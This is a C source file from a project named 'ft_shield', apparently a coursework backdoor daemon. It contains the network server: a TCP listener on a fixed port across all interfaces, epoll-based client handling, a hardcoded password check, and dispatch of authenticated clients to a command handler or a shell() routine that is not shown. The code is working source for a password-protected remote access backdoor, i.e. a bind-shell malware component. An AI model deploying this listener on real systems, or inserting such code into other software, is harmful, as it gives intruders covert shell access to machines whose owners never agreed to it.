#include "../ft_shield.h"

extern int	g_shelllvl;
extern int	g_shelling;
extern int	g_shells[BACKLOG];
int			g_oks[BACKLOG];

int	n_clients = 0;

void	epoll_ctl_add(int epfd, int fd, int events)
{
	struct epoll_event	ev;

	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

int	create_server(void)
{
	int					sfd;
	int					opt;
	struct sockaddr_in	addr;

	sfd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0);
	if (sfd < 0)
		return (-1);
	opt = 1;
	if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt) < 0)
		return (-1);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(PORT);
	if (bind(sfd, (struct sockaddr *)&addr, sizeof addr) < 0)
		return (-1);
	if (listen(sfd, CONCURRENT_USERS) < 0)
		return (-1);
	return (sfd);
}

void	exit_client(int epfd, int cfd)
{
	epoll_ctl(epfd, EPOLL_CTL_DEL, cfd, NULL);
	g_shells[cfd] = 0;
	g_oks[cfd] = 0;
	--n_clients;
	close(cfd);
}

void	check_password(int epfd, int cfd)
{
	char	buf[4096];
	ssize_t	n;

	n = read(cfd, buf, sizeof buf);
	if (n <= 0)
		return ;
	buf[n-1] = 0;
	if (strcmp(buf, PASSWORD) == 0)
	{
		g_oks[cfd] = 1;
		++n_clients;
		if (g_shelling)
			shell(epfd, cfd);
		prompt(cfd);
	}
	else
	{
		write(cfd, INVALID_PASSWORD_MSG, sizeof INVALID_PASSWORD_MSG);
		exit_client(epfd, cfd);
	}
}

void	ask_password(int cfd)
{
	write(cfd, PASSWORD_PROMPT, sizeof PASSWORD_PROMPT);
}

void	listen_server(void)
{
	int					epfd;
	int					sfd;
	int					n;
	struct epoll_event	events[BACKLOG];
	int					cfd;

	sfd = create_server();
	if (sfd < 0)
		return ;
	epfd = epoll_create(1);
	epoll_ctl_add(epfd, sfd, EPOLLIN|EPOLLOUT);
	while (1)
	{
		n = epoll_wait(epfd, events, BACKLOG, -1);
		if (n < 0)
		{
			if (errno == EINTR)
				continue ;
			break ;
		}
		while (n--)
		{
			cfd = events[n].data.fd;
			if (cfd == sfd)
			{
				if (n_clients < CONCURRENT_USERS)
				{
					cfd = accept(sfd, NULL, 0);
					epoll_ctl_add(epfd, cfd, EPOLLIN|EPOLLRDHUP);
					ask_password(cfd);
				}
			}
			else if (events[n].events & EPOLLIN
					&& cfd < BACKLOG && !g_shells[cfd])
			{
				if (!g_oks[cfd])
					check_password(epfd, cfd);
				else
					handle_command(epfd, cfd);
			}
			if (events[n].events & (EPOLLRDHUP|EPOLLHUP|EPOLLERR))
				exit_client(epfd, cfd);
		}
	}
}
